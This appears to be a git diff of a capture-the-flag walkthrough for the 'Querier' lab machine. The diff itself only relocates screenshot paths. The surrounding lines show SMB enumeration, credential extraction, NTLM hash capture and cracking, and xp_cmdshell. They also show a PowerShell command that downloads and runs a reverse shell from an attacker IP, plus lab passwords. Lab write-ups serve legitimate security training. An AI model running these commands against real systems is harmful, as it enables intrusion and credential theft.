@@ -49,7 +49,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.10.248
 ```
 
-![ping](querier_01_ping.png)
+![ping](screenshots/querier_01_ping.png)
 
 ---
 
@@ -69,13 +69,13 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.10.248 -oG allPorts
 - `-Pn` : Skip host discovery and treat the host as up.  
 - `-oG` : Save grepable output for parsing.  
 
-![allports](querier_02_nmap_allports.png)
+![allports](screenshots/querier_02_nmap_allports.png)
 
 ```bash
 extractPorts allPorts
 ```
 
-![extractports](querier_03_extractports.png)
+![extractports](screenshots/querier_03_extractports.png)
 
 ---
 
@@ -92,7 +92,7 @@ cat targeted
 - `-sV` : Detect service versions.  
 - `-oN` : Save normal output for review.  
 
-![targeted](querier_04_nmap_targeted.png)
+![targeted](screenshots/querier_04_nmap_targeted.png)
 
 **Findings:**
 
@@ -123,7 +123,7 @@ smbclient -L //10.129.10.248 -N
 smbmap -u 'guest' -p '' -H 10.129.10.248
 ```
 
-![smb-enumeration](querier_05_smb_enumeration_shares.png)
+![smb-enumeration](screenshots/querier_05_smb_enumeration_shares.png)
 
 The **`Reports`** share is **READ ONLY** for guest. After list it, we can see a workbook, download it:
 
@@ -132,7 +132,7 @@ smbclient //10.129.10.248/Reports -N -c "ls"
 smbclient //10.129.10.248/Reports -N -c "get \"Currency Volume Report.xlsm\""
 ```
 
-![reports-list-get](querier_06_smb_reports_list_get.png)
+![reports-list-get](screenshots/querier_06_smb_reports_list_get.png)
 
 ---
 
@@ -146,7 +146,7 @@ python3 -m oletools.olevba "Currency Volume Report.xlsm"
 
 The macro defines an **ADO** connection string with **`Uid=reporting`**, **`Pwd=...`**, **`Database=volume`**, **`Server=QUERIER`**.
 
-![olevba](querier_07_olevba_connection_string.png)
+![olevba](screenshots/querier_07_olevba_connection_string.png)
 
 ---
 
@@ -163,7 +163,7 @@ crackmapexec smb 10.129.10.248 -u 'reporting' -p 'PcwTWTHRwryjc$c6'
 crackmapexec smb 10.129.10.248 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
 ```
 
-![cme-reporting](querier_08_cme_workgroup_reporting.png)
+![cme-reporting](screenshots/querier_08_cme_workgroup_reporting.png)
 
 ---
 
@@ -177,7 +177,7 @@ impacket-mssqlclient WORKGROUP/reporting@10.129.10.248 -windows-auth
 
 Password: **`PcwTWTHRwryjc$c6`** (paste at prompt). Session should land in **`volume`**.
 
-![mssql-reporting](querier_09_mssql_reporting_volume.png)
+![mssql-reporting](screenshots/querier_09_mssql_reporting_volume.png)
 
 **`xp_cmdshell`** and **`sp_configure`** are **denied** for this login.
 
@@ -197,7 +197,7 @@ In **SQL**:
 EXEC master..xp_dirtree '\\10.10.15.206\test', 1, 1;
 ```
 
-![responder-xp-dirtree](querier_10_responder_xp_dirtree_hash.png)
+![responder-xp-dirtree](screenshots/querier_10_responder_xp_dirtree_hash.png)
 
 Save the **NetNTLMv2** line (e.g. `hash_mssql_svc.txt`) and crack:
 
@@ -205,7 +205,7 @@ Save the **NetNTLMv2** line (e.g. `hash_mssql_svc.txt`) and crack:
 john --format=netntlmv2 hash_mssql_svc.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![john](querier_11_john_mssql_svc.png)
+![john](screenshots/querier_11_john_mssql_svc.png)
 
 **Recovered:** **`mssql-svc`** / **`corporate568`**
 
@@ -229,7 +229,7 @@ RECONFIGURE;
 xp_cmdshell "whoami"
 ```
 
-![xp-cmdshell-whoami](querier_12_mssql_xp_cmdshell_whoami.png)
+![xp-cmdshell-whoami](screenshots/querier_12_mssql_xp_cmdshell_whoami.png)
 
 ---
 
@@ -248,7 +248,7 @@ Append a one-liner at the end of **`PS.ps1`** (replace IP/port with your listene
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.206 -Port 443
 ```
 
-![wget-nishang](querier_13_wget_nishang_ps1.png)
+![wget-nishang](screenshots/querier_13_wget_nishang_ps1.png)
 
 ---
 
@@ -267,7 +267,7 @@ From SQL:
 xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.15.206/PS.ps1\")"
 ```
 
-![reverse-shell-http-nc](querier_14_reverse_shell_http_nc.png)
+![reverse-shell-http-nc](screenshots/querier_14_reverse_shell_http_nc.png)
 
 ---
 
@@ -280,7 +280,7 @@ whoami
 type C:\Users\mssql-svc\Desktop\user.txt
 ```
 
-![user-flag](querier_15_user_txt.png)
+![user-flag](screenshots/querier_15_user_txt.png)
 
 ðŸ **User flag obtained**
 
@@ -311,7 +311,7 @@ Get-Content C:\Windows\Temp\powerup.txt
 
 with **`Administrator`** credentials in the tool output.
 
-![powerup-cached-gpp](querier_16_powerup_cached_gpp.png)
+![powerup-cached-gpp](screenshots/querier_16_powerup_cached_gpp.png)
 
 ---
 
@@ -324,7 +324,7 @@ crackmapexec smb 10.129.10.248 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!
 crackmapexec winrm 10.129.10.248 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
 ```
 
-![cme-admin-smb-winrm](querier_17_cme_administrator_smb_winrm.png)
+![cme-admin-smb-winrm](screenshots/querier_17_cme_administrator_smb_winrm.png)
 
 Then use **Evil-WinRM** to get an interactive shell and read **`root.txt`**:
 
@@ -334,7 +334,7 @@ whoami
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-![evil-winrm-root](querier_18_evil_winrm_root_txt.png)
+![evil-winrm-root](screenshots/querier_18_evil_winrm_root_txt.png)
 
 ðŸ **Root flag obtained**
 
